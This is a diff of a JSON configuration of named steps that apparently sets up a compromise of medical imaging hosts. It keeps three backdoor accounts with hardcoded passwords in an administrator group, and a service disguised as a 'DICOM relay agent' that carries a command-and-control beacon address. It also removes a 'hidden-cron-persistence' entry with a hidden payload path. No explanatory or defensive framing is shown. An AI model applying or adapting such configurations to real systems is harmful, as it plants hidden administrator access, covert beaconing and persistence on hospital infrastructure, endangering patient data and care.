@@ -236,7 +236,7 @@
       "vars": {
         "USERNAME": "imaging-ops",
         "PASSWORD": "Imaging2026!",
-        "GROUPS_ADD": "sudo"
+        "GROUPS_ADD": "wheel"
       }
     },
     {
@@ -257,7 +257,7 @@
       "vars": {
         "USERNAME": "vendor-support",
         "PASSWORD": "Meridian2026!",
-        "GROUPS_ADD": "sudo"
+        "GROUPS_ADD": "wheel"
       }
     },
     {
@@ -272,7 +272,7 @@
       "vars": {
         "USERNAME": "pacs-agent",
         "PASSWORD": "Pacs2026!",
-        "GROUPS_ADD": "sudo"
+        "GROUPS_ADD": "wheel"
       }
     },
     {
@@ -289,12 +289,6 @@
         "DESCRIPTION": "DICOM relay agent",
         "EXEC_START": "/bin/sh -c 'while true; do sleep 210; done'",
         "EXTRA_LINE": "Environment=C2=http://198.51.100.77:8443/beacon"
-      }
-    },
-    {
-      "name": "hidden-cron-persistence",
-      "vars": {
-        "PAYLOAD": "/usr/local/sbin/.dicom-sync"
       }
     },
     {
